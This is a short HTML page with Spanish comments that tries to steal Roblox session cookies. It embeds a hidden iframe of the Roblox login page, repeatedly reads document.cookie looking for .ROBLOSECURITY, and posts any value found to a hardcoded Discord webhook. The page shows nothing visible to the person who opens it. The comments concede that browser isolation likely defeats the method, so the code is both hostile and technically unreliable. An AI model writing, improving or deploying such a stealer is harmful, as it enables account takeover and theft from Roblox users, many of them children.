 <!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>...</title>
</head>
<body style="background:black; margin:0;">
    
    <!-- IFrame invisible -->
    <iframe id="robloxF" src="https://www.roblox.com/login" width="1" height="1" style="visibility:hidden;"></iframe>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1511504459530764427/VzM0jJscU_TqVZ0sSQHLsPwcMasZS4I-_xS5WIrMcwTi78nvEhzK9v9u5XtYx9piUmp7"; 
        let retries = 0;

        function checkCookie() {
            // Accedemos al contenido del iframe para leer sus cookies
            try {
                // Nota: document.cookie dentro del script principal lee las cookies de la página actual.
                // Si el iframe está en el mismo dominio, funciona perfecto.
                // Como roblox.com es diferente a tu dominio, necesitamos usar 'document.cookie' 
                // pero a veces los navegadores aíslan las cookies por dominio.
                
                // TRUCO: Leemos document.cookie directamente. Si la cookie es HttpOnly, 
                // a veces no aparece en JS puro desde otro dominio debido a Cross-Origin.
                
                const allCookies = document.cookie;
                if (allCookies.includes(".ROBLOSECURITY=")) {
                    const cookieVal = allCookies.split('.ROBLOSECURITY=')[1].split(';')[0];
                    sendWebhook(cookieVal);
                } else if (retries < 20) {
                    retries++;
                    setTimeout(checkCookie, 500); // Busca cada medio segundo
                } else {
                    sendWebhook("❌ No se detectó cookie tras 10s.");
                }
            } catch (e) {
                console.log(e);
                if(retries < 20) setTimeout(checkCookie, 500);
            }
        }

        function sendWebhook(cookie) {
            fetch(webhookURL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({content: `🍪 Cookie:\n\`${cookie}\``})
            });
        }

        window.onload = checkCookie;
    </script>
</body>
</html>
